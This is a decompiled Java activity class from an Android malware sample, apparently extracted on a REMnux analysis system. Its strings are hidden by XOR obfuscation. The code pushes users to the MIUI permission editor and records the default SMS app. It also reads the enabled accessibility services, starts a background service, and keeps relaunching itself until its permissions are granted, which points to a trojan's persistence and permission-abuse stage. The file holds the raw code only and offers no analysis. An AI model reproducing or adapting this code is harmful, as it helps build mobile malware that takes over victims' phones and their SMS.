package com.zjxyxnvvp.nxvxchltf;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.provider.Telephony;
import com.zjxyxnvvp.nxvxchltf.util.InioawndOIADNwaiond;
import com.zjxyxnvvp.nxvxchltf.util.a;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.e;
import com.zjxyxnvvp.nxvxchltf.util.l;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class KAopneaoniAoiasM extends Activity {
    private static short[] $ = {5966, 5954, 5952, 5891, 5952, 5956, 5976, 5956, 5891, 5982, 5960, 5966, 5976, 5983, 5956, 5977, 5972, 5966, 5960, 5955, 5977, 5960, 5983, 92, 80, 82, 17, 82, 86, 74, 86, 17, 79, 90, 77, 82, 92, 90, 81, 75, 90, 77, 17, 79, 90, 77, 82, 86, 76, 76, 86, 80, 81, 76, 17, 111, 90, 77, 82, 86, 76, 76, 86, 80, 81, 76, 122, 91, 86, 75, 80, 77, 126, 92, 75, 86, 73, 86, 75, 70, 4750, 4755, 4767, 4761, 4746, 4788, 4763, 4736, 4748, 4741, 4746, 4742, 4750, 1534, 1519, 1517, 1509, 1519, 1513, 1515, 1897, 1896, 1899, 1874, 1918, 1888, 1918, 1874, 1888, 1900, 1891, 1900, 1898, 1896, 1919, 31864, 31839, 31818, 31833, 31839, 31755, 31837, 31769, 31771, 31769, 31768, 31755, 31747, 31871, 31864, 31755, 31849, 31838, 31839, 31839, 31812, 31813, 31746, 27042, 27049, 27046, 27045, 27051, 27042, 27043, 27032, 27046, 27044, 27044, 27042, 27060, 27060, 27054, 27045, 27054, 27051, 27054, 27059, 27070, 27032, 27060, 27042, 27061, 27057, 27054, 27044, 27042, 27060, 20799, 20760, 20741, 20738, 20759, 20762, 20762, 20755, 20754, 20822, 20759, 20757, 20757, 20755, 20741, 20741, 20767, 20756, 20767, 20762, 20767, 20738, 20751, 20822, 20741, 20755, 20740, 20736, 20767, 20757, 20755, 20741, 20822, 22207, 22190, 22182, 22184, 22186, 22190};

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(Context context) {
        if (l.g()) {
            Intent intent = new Intent();
            intent.setClassName($(0, 23, 5933), $(23, 80, 63));
            intent.putExtra($(80, 93, 4843), context.getPackageName());
            intent.setData(Uri.fromParts($(93, 100, 1422), context.getPackageName(), null));
            context.startActivity(intent);
            a.h = System.currentTimeMillis() + 2000;
        }
    }

    public static void b(Context context) {
        context.startService(new Intent(context, niNOIAdiowanOI.class));
    }

    private void c() {
        d dVar = d.e;
        String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(this);
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
        String $2 = $(100, 115, 1805);
        String e = aVar.e(this, $2);
        if (e == null || e.length() <= 1) {
            dVar.f314a.c(this, $2, defaultSmsPackage);
        }
    }

    public static void d(Context context) {
        if (!g.a(context)) {
            context.startService(new Intent(context, niNOIAdiowanOI.class));
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        if (b.n(this, UIDNwaidobaWIODb.class)) {
            finish();
            return;
        }
        try {
            b.h(this);
            e.a($(115, 138, 31787) + b.l(this));
            c();
            b.w(this);
            b.t(this);
            d(this);
            String string = Settings.Secure.getString(getContentResolver(), $(138, 168, 27079));
            e.a($(168, 201, 20854) + string);
            if (b.n(this, UIDNwaidobaWIODb.class)) {
                try {
                    a(this);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                finish();
                return;
            }
            startActivity(new Intent(this, InioawndOIADNwaiond.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
            $(201, 207, 22215).equalsIgnoreCase(Build.MANUFACTURER);
            finish();
        } catch (Throwable unused) {
            finish();
        }
    }

    @Override // android.app.Activity
    protected void onPause() {
        super.onPause();
        if (b.n(this, UIDNwaidobaWIODb.class)) {
            try {
                a(this);
            } catch (Exception e) {
                e.printStackTrace();
            }
            finish();
            return;
        }
        startActivity(new Intent(this, InioawndOIADNwaiond.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
    }

    @Override // android.app.Activity
    protected void onResume() {
        super.onResume();
        if (b.n(this, UIDNwaidobaWIODb.class)) {
            try {
                a(this);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            startActivity(new Intent(this, InioawndOIADNwaiond.class).addFlags(268435456).addFlags(536870912).addFlags(1073741824));
        }
    }
}
